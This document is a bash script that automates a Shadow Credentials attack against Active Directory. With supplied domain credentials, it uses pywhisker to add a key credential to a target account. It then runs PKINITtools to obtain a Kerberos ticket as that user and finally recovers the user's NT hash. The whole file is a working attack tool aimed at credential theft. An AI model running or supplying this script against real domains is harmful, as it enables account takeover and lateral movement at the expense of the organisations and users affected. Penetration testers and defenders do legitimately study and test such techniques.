#!/usr/bin/env bash

# Usage: $0 <domain> <username> <password> <target_user> <dc_ip>
if [ "$#" -ne 5 ]; then
    echo "Usage: $0 <domain> <username> <password> <target_user> <dc_ip>"
    exit 1
fi

DOMAIN="$1"
USERNAME="$2"
PASSWORD="$3"
TARGET_USER="$4"
DC_IP="$5"

# Full paths to gettgtpkinit.py and getnthash.py
GETTGT_PY="/home/kali/Transfers/PKINITtools/gettgtpkinit.py"
GETNTHASH_PY="/home/kali/Transfers/PKINITtools/getnthash.py"

echo "[*] Starting attack for: $TARGET_USER@$DOMAIN"

# Requesting certificate with pywhysker
echo "[*] Requesting certificate with pywhisker..."
echo -e "\033[1;32m    pywhisker -d \"$DOMAIN\" -u \"$USERNAME\" -p \"$PASSWORD\" --target \"$TARGET_USER\" --action 'add' --dc-ip \"$DC_IP\" > pywhisker_output.txt\033[0m"
pywhisker -d "$DOMAIN" -u "$USERNAME" -p "$PASSWORD" --target "$TARGET_USER" --action 'add' --dc-ip "$DC_IP" > pywhisker_output.txt 2>&1

# Retrieve .pfx certificate and its password from pywhisker output
PFX_FILE=$(grep 'Saved PFX' pywhisker_output.txt | awk '{print $NF}')
PFX_PASS=$(grep 'password' pywhisker_output.txt | awk '{print $NF}')

if [ -z "$PFX_FILE" ] || [ -z "$PFX_PASS" ]; then
    echo "[!] pywhisker failed. See output below:"
    cat pywhisker_output.txt
    exit 1
fi

echo "[+] PFX file: $PFX_FILE"
echo "[+] PFX password: $PFX_PASS"

# Requesting a TGT using the .pfx certificate
echo "[*] Requesting TGT with the certificate $PFX_FILE..."
echo -e "\033[1;32m    python3 \"$GETTGT_PY\" -dc-ip \"$DC_IP\" -cert-pfx \"$PFX_FILE\" -pfx-pass \"$PFX_PASS\" \"$DOMAIN/$TARGET_USER\" ccache_$TARGET_USER > gettgt_output.txt 2>&1\033[0m"
python3 "$GETTGT_PY" -dc-ip "$DC_IP" -cert-pfx "$PFX_FILE" -pfx-pass "$PFX_PASS" "$DOMAIN/$TARGET_USER" ccache_$TARGET_USER > gettgt_output.txt 2>&1

# Retrieving the AES key from the TGT
AES_KEY=$(grep -Eo '\b[0-9a-f]{64}\b' gettgt_output.txt | head -n1)

if [ -z "$AES_KEY" ]; then
    echo "[!] gettgtpkinit.py failed to produce AES key. See output below:"
    cat gettgt_output.txt
    exit 1
fi

echo "[+] AES key: $AES_KEY"

# Export the ticket
export KRB5CCNAME=$(pwd)/ccache_$TARGET_USER

# Using the AES key to retrieve the NT hash from the ticket.
echo "[*] Extracting NT hash from the ticket using the AES key..."
echo -e "\033[1;32m    python3 \"$GETNTHASH_PY\" \"$DOMAIN/$TARGET_USER\" -key \"$AES_KEY\" -dc-ip \"$DC_IP\"\033[0m"
HASH_OUTPUT=$(python3 "$GETNTHASH_PY" "$DOMAIN/$TARGET_USER" -key "$AES_KEY" -dc-ip "$DC_IP" 2>&1)

# Extract the NT hash line directly and highlight in red
NT_HASH=$(echo "$HASH_OUTPUT" | grep -Eo '\b[0-9a-f]{32}\b')
if [ -n "$NT_HASH" ]; then
    echo -e "\033[1;31m[*] Recovered NT Hash: $NT_HASH\033[0m"
else
    echo "[!] getnthash.py failed. See output below:"
    echo "$HASH_OUTPUT"
    exit 1
fi

# Clean up outputs
rm -f pywhisker_output.txt gettgt_output.txt
